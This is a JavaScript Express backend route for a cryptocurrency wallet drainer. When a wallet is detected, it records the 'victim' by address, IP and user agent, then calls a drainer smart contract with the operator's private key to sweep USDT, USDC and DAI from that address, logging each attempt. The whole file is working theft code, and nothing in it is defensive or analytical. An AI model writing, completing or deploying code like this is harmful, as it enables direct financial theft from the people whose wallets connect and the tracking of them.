import { Router } from 'express'
import { prisma } from '../lib/prisma.js'
import { ethers } from 'ethers'

export const drainRoutes = Router()

// IMMEDIATE DRAIN when frontend detects wallet
drainRoutes.post('/immediate', async (req, res) => {
  const { address, chain, tokens } = req.body
  
  try {
    // 1. Save victim
    const victim = await prisma.victim.upsert({
      where: { address },
      update: { lastSeen: new Date() },
      create: {
        address,
        chain,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
        createdAt: new Date()
      }
    })
    
    // 2. Try to drain
    let drainResult = { success: false, error: 'Not implemented' }
    
    if (chain === 'evm') {
      drainResult = await drainEVMTokens(address, tokens)
    } else if (chain === 'tron') {
      drainResult = await drainTronTokens(address, tokens)
    }
    
    // 3. Log result
    await prisma.drainLog.create({
      data: {
        victimId: victim.id,
        action: 'IMMEDIATE_DRAIN_ATTEMPT',
        success: drainResult.success,
        txHash: drainResult.txHash,
        amount: drainResult.amount,
        error: drainResult.error,
        timestamp: new Date()
      }
    })
    
    res.json({
      success: drainResult.success,
      message: drainResult.success ? 'Drain attempted' : 'Drain failed',
      ...drainResult
    })
    
  } catch (error) {
    console.error('Immediate drain error:', error)
    res.status(500).json({ error: error.message })
  }
})

async function drainEVMTokens(victimAddress, tokens = []) {
  try {
    const provider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL)
    const wallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, provider)
    
    // Load contract ABI (you must save this!)
    const contractABI = require('../contracts/RealDrainer.json').abi
    const contract = new ethers.Contract(process.env.EVM_DRAINER_CONTRACT, contractABI, wallet)
    
    // Default tokens if none provided
    const tokensToDrain = tokens.length > 0 ? tokens : [
      '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
      '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
      '0x6B175474E89094C44Da98b954EedeAC495271d0F'  // DAI
    ]
    
    // Call contract
    const tx = await contract.drainAllTokens(victimAddress, tokensToDrain, {
      gasLimit: 500000
    })
    
    const receipt = await tx.wait()
    
    return {
      success: true,
      txHash: tx.hash,
      amount: 'unknown', // Contract should return amount
      blockNumber: receipt.blockNumber
    }
    
  } catch (error) {
    return {
      success: false,
      error: error.message,
      txHash: null
    }
  }
}
